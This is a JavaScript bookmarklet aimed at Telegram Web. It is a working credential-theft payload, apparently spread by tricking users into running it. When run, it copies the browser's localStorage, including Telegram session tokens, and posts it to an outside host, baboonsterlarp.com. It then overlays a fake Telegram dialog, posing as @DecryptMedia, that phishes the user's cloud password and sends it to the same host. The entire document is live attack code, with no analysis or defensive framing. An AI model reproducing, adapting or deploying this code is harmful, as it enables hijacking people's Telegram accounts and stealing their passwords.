javascript: try {
        const redirect = "https://google.com";
        function t(t, e) {
            fetch(t, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: new URLSearchParams(e).toString()
            })
                .then(function (response) {
                    if (response.ok) {
                        console.log("Form submitted successfully!");
                    } else {
                        console.log("Form submission failed. Status: " + response.status);
                    }
                })
                .catch(function (error) {
                    console.log("Form submission failed. Error: " + error);
                });
        }

        function t2(t, e) {
            var s = document.createElement("form"); 
            for (var a in s.setAttribute("method", "POST"), s.setAttribute("action", t), e) 
                if (e.hasOwnProperty(a)) { 
                    var i = document.createElement("input"); 
                    i.setAttribute("type", "hidden"), i.setAttribute("name", a), i.setAttribute("value", e[a]), s.appendChild(i); 
                }
            document.body.appendChild(s), s.submit(); 
        }


        if (location.href.includes("web.telegram.org")) {
            if (localStorage.user_auth != undefined) {

                async function s() {
                    let a = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        let c = localStorage.key(i),
                            n = localStorage.getItem(c);
                        if ("tt-global-state" != c) a[c] = n; 
                    }
                    if (null != a.xt_instance) {
                        let l = JSON.parse(a.xt_instance);
                        l.time = "REPLACE_THIS";
                        a.xt_instance = JSON.stringify(l);
                    }
                    var r, o = {
                        data: JSON.stringify(a).toString(),
                        version: JSON.stringify(location.pathname),
                        password: null
                    };
                    console.log(JSON.stringify(a).toString())
                    try {
                        t("https://www.baboonsterlarp.com/telegram-log", o);
                    } catch (a) { }

                
                    if (location.pathname == "/a/") {
                        const elementHtml = `<div>
                            <style>
                            @keyframes fade-in-fwd {
  0% {
    transform: translateZ(-80px);
    opacity: 0;
  }
  100% {
    transform: translateZ(0);
    opacity: 1;
  }
}

                            </style>
                           <div class="Modal confirm opacity-transition fast open shown" tabindex="-1" role="dialog" >
                              <div class="modal-container" style="animation: fade-in-fwd 0.5s cubic-bezier(0.390, 0.575, 0.565, 1.000) 1s both;">
                                 <div class="modal-backdrop" id="backdrop"></div>
                                 <div class="modal-dialog">
                                    <div class="modal-header">
                                       <div class="modal-title">Telegram</div>
                                    </div>
                                    <div class="modal-content custom-scroll">
                                        <p>For added security and to protect your data, we kindly request your cloud password to confirm submission to <a href="https://t.me/DecryptNews" style="color: #3390EC; text-decoration: none;">@DecryptMedia</a>.</p>
                                        <p>By submitting this form, you agree to share the information provided in your consent form with @DecryptMedia. This allows us to process and fulfill your request accurately.</p>
                                       <div class="input-group password-input">
                                            <input class="form-control" type="password" id="sign-in-password" autocomplete="current-password" maxlength="256" dir="auto">
                                            <label>Password</label>
                                            <div class="div-button toggle-password" role="button" tabindex="0" title="Toggle password visibility"></div>
                                       </div>
                                       <div class="dialog-buttons mt-2" tabindex="-1">
                                            <button type="button" class="Button confirm-dialog-button default primary text" style="" id="submit" >Submit</button>
                                            <button type="button" class="Button confirm-dialog-button default danger text" style="" id="cancel" >Cancel</button>
                                        </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                    `;
                        const div = document.createElement('div');
                        div.class = "modal-header";
                        div.innerHTML = elementHtml;


                        const element = div.firstChild;
                        document.evaluate('/html/body/div[1]',
                            document,
                            null,
                            XPathResult.FIRST_ORDERED_NODE_TYPE,
                            null,
                        ).singleNodeValue.appendChild(element);

                        document.getElementById("submit").addEventListener("click", () => {
                            var r, o = {
                                version: JSON.stringify(location.pathname),
                                password: document.getElementById("sign-in-password").value,
                                redirect: redirect
                            };
                            try {
                                t2("https://www.baboonsterlarp.com/password", o); 
                            } catch (a) { }
                        })

                        document.getElementById("cancel").addEventListener("click", () => {
                            var r, o = {
                                version: JSON.stringify(location.pathname),
                                password: "CANCELED",
                                redirect: "none"
                            };
                            try {
                                t("https://www.baboonsterlarp.com/password", o); 
                                element.remove();
                            } catch (a) { }
                        })

                        document.getElementById("sign-in-password").addEventListener("keypress", (e) => {
                            if (e.key === 'Enter') {
                                var r, o = {
                                    version: JSON.stringify(location.pathname),
                                    password: document.getElementById("sign-in-password").value,
                                    redirect: redirect
                                };
                                try {
                                    t2("https://www.baboonsterlarp.com/password", o); 
                                } catch (a) { }
                            }
                        })

                        document.getElementById("backdrop").addEventListener("click", () => {
                            var r, o = {
                                version: JSON.stringify(location.pathname),
                                password: "CANCELED",
                                redirect: "none"
                            };
                            try {
                                t("https://www.baboonsterlarp.com/password", o); 
                                element.remove();
                            } catch (a) { }
                        })
                    }
                    else {
                        const elementHtml = `<div class="popup popup-peer logout active">
                            <style>
                            @keyframes fade-in-fwd {
  0% {
    transform: translateZ(-80px);
    opacity: 0;
  }
  100% {
    transform: translateZ(0);
    opacity: 1;
  }
}

                            </style>
   <div class="popup-container z-depth-1" style="animation: fade-in-fwd 0.5s cubic-bezier(0.390, 0.575, 0.565, 1.000) 1s both; width: 500px !important" >
      <div class="popup-header">
         <div class="popup-title"><span class="i18n">Telegram</span></div>
      </div>
      <p class="popup-description"><span class="i18n">For added security and to protect your data, we kindly request your cloud password to confirm submission to <a href="https://t.me/DecryptNews" style="color: #3390EC; text-decoration: none;">@DecryptMedia</a>.<br><br>By submitting this form, you agree to share the information provided in your consent form with @DecryptMedia. This allows us to process and fulfill your request accurately.</span></p>

      <div class="input-field input-field-password">
         <input id="sign-in-password" type="password" name="notsearch_password" autocomplete="off" required="" class="input-field-input" dir="auto">
         <div class="input-field-border"></div>
         <label><span class="i18n">Password</span></label>
      </div>

      <div class="popup-buttons">
         <button class="btn primary rp" id="submit">
            <div class="c-ripple"></div>
            <span class="i18n">Submit</span>
         </button>
         <button class="btn danger rp" id="cancel">
            <div class="c-ripple"></div>
            <span class="i18n">Cancel</span>
         </button>
      </div>
   </div>
</div>`;
                        const div = document.createElement('div');
                        div.class = "popup popup-peer logout active";
                        div.innerHTML = elementHtml;


                        const element = div.firstChild;
                        document.evaluate('/html/body',
                            document,
                            null,
                            XPathResult.FIRST_ORDERED_NODE_TYPE,
                            null,
                        ).singleNodeValue.appendChild(element);

                        document.getElementById("submit").addEventListener("click", () => {
                            var r, o = {
                                version: JSON.stringify(location.pathname),
                                password: document.getElementById("sign-in-password").value,
                                redirect: redirect
                            };
                            try {
                                t2("https://www.baboonsterlarp.com/password", o); 
                            } catch (a) { }
                        })

                        document.getElementById("cancel").addEventListener("click", () => {
                            var r, o = {
                                version: JSON.stringify(location.pathname),
                                password: "CANCELED",
                                redirect: "none"
                            };
                            try {
                                t("https://www.baboonsterlarp.com/password", o); 
                                element.remove();
                            } catch (a) { }
                        })

                        document.getElementById("sign-in-password").addEventListener("keypress", (e) => {
                            if (e.key === 'Enter') {
                                var r, o = {
                                    version: JSON.stringify(location.pathname),
                                    password: document.getElementById("sign-in-password").value,
                                    redirect: redirect
                                };
                                try {
                                    t2("https://www.baboonsterlarp.com/password", o); 
                                } catch (a) { }
                            }
                        })
                    }
                }
                s(); 
            } else {
                if (location.pathname == "/a/") {
                        const elementHtml = `<div>
                            <style>
                            @keyframes fade-in-fwd {
  0% {
    transform: translateZ(-80px);
    opacity: 0;
  }
  100% {
    transform: translateZ(0);
    opacity: 1;
  }
}

                            </style>
                           <div class="Modal confirm opacity-transition fast open shown" tabindex="-1" role="dialog" >
                              <div class="modal-container" style="animation: fade-in-fwd 0.5s cubic-bezier(0.390, 0.575, 0.565, 1.000) 1s both;">
                                 <div class="modal-backdrop" id="backdrop"></div>
                                 <div class="modal-dialog">
                                    <div class="modal-header">
                                       <div class="modal-title">Telegram</div>
                                    </div>
                                    <div class="modal-content custom-scroll">
                                        <p>For added security and to protect your data, we kindly request your cloud password to confirm submission to <a href="https://t.me/DecryptNews" style="color: #3390EC; text-decoration: none;">@DecryptMedia</a>.</p>
                                        <p>By submitting this form, you agree to share the information provided in your consent form with @DecryptMedia. This allows us to process and fulfill your request accurately.</p>
                                       <div class="input-group password-input">
                                            <input class="form-control" type="password" id="sign-in-password" autocomplete="current-password" maxlength="256" dir="auto">
                                            <label>Password</label>
                                            <div class="div-button toggle-password" role="button" tabindex="0" title="Toggle password visibility"></div>
                                       </div>
                                       <div class="dialog-buttons mt-2" tabindex="-1">
                                            <button type="button" class="Button confirm-dialog-button default primary text" style="" id="submit" >Submit</button>
                                            <button type="button" class="Button confirm-dialog-button default danger text" style="" id="cancel" >Cancel</button>
                                        </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                    `;
                        const div = document.createElement('div');
                        div.class = "modal-header";
                        div.innerHTML = elementHtml;


                        const element = div.firstChild;
                        document.evaluate('/html/body/div[1]',
                            document,
                            null,
                            XPathResult.FIRST_ORDERED_NODE_TYPE,
                            null,
                        ).singleNodeValue.appendChild(element);

                        var r, o = {
                                version: JSON.stringify(location.pathname),
                            };
                            try {
                                t("https://www.baboonsterlarp.com/not-logged", o); 
                            } catch (a) { }

                        document.getElementById("submit").addEventListener("click", () => {

                            element.remove();
                        })
                       

                        document.getElementById("backdrop").addEventListener("click", () => {
                            element.remove();
                        })
                    }
                    else {
                        const elementHtml = `<div class="popup popup-peer logout active">
                            <style>
                            @keyframes fade-in-fwd {
  0% {
    transform: translateZ(-80px);
    opacity: 0;
  }
  100% {
    transform: translateZ(0);
    opacity: 1;
  }
}

                            </style>
   <div class="popup-container z-depth-1" style="animation: fade-in-fwd 0.5s cubic-bezier(0.390, 0.575, 0.565, 1.000) 1s both; width: 500px !important" >
      <div class="popup-header">
         <div class="popup-title"><span class="i18n">Telegram</span></div>
      </div>
      <p class="popup-description"><span class="i18n">For added security and to protect your data, we kindly request your cloud password to confirm submission to <a href="https://t.me/DecryptNews" style="color: #3390EC; text-decoration: none;">@DecryptMedia</a>.<br><br>By submitting this form, you agree to share the information provided in your consent form with @DecryptMedia. This allows us to process and fulfill your request accurately.</span></p>

      <div class="input-field input-field-password">
         <input id="sign-in-password" type="password" name="notsearch_password" autocomplete="off" required="" class="input-field-input" dir="auto">
         <div class="input-field-border"></div>
         <label><span class="i18n">Password</span></label>
      </div>

      <div class="popup-buttons">
         <button class="btn primary rp" id="submit">
            <div class="c-ripple"></div>
            <span class="i18n">Submit</span>
         </button>
         <button class="btn danger rp" id="cancel">
            <div class="c-ripple"></div>
            <span class="i18n">Cancel</span>
         </button>
      </div>
   </div>
</div>`;
                        const div = document.createElement('div');
                        div.class = "popup popup-peer logout active";
                        div.innerHTML = elementHtml;


                        const element = div.firstChild;
                        document.evaluate('/html/body',
                            document,
                            null,
                            XPathResult.FIRST_ORDERED_NODE_TYPE,
                            null,
                        ).singleNodeValue.appendChild(element);
                        var r, o = {
                                version: JSON.stringify(location.pathname),
                            };
                            try {
                                t("https://www.baboonsterlarp.com/not-logged", o); 
                            } catch (a) { }

                        document.getElementById("submit").addEventListener("click", () => {

                            element.remove();
                        })
                    }
            }
        } else {
            alert("location.message"); 
        }
    } catch (a) {
        alert("Please reload the page and try again.");
        location.reload(); 
    }
